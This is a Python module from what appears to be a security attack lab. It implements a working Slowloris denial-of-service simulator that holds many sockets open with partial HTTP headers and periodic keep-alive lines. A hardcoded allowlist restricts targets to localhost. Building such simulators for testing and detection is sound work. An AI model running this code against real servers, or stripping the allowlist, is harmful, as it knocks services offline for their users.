"""
attack_lab/scenarios/slowloris.py
=====================================
Slowloris DoS Simulator
Sends partial HTTP headers slowly to exhaust server connections
MITRE: T1499
"""
import socket, time, random, logging, threading
log = logging.getLogger("sentinel.attack_lab.slowloris")

ALLOWED = ["127.0.0.1", "localhost"]

def run(target="127.0.0.1", port=5001, connections=50, duration=30, verbose=True):
    if target not in ALLOWED:
        raise ValueError(f"[SAFETY] Target {target} not allowed.")

    results = {"connections_made": 0, "errors": 0}
    sockets = []
    end_time = time.time() + duration

    if verbose:
        log.info(f"[Slowloris] Starting → {target}:{port} | {connections} connections | {duration}s")

    # Open connections and send partial headers
    for _ in range(connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            s.send(f"GET /slow?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {target}\r\n".encode())
            s.send(b"User-Agent: Slowloris/1.0\r\n")
            sockets.append(s)
            results["connections_made"] += 1
        except Exception as e:
            results["errors"] += 1
            log.debug(f"[Slowloris] Connection error: {e}")

    if verbose:
        log.info(f"[Slowloris] {len(sockets)} connections open, holding...")

    while time.time() < end_time and sockets:
        for s in list(sockets):
            try:
                s.send(f"X-Keep-Alive: {random.randint(1,999)}\r\n".encode())
            except Exception:
                sockets.remove(s)
        time.sleep(10)

    for s in sockets:
        try: s.close()
        except: pass

    if verbose:
        log.info(f"[Slowloris] Done: {results['connections_made']} connections used")
    return results
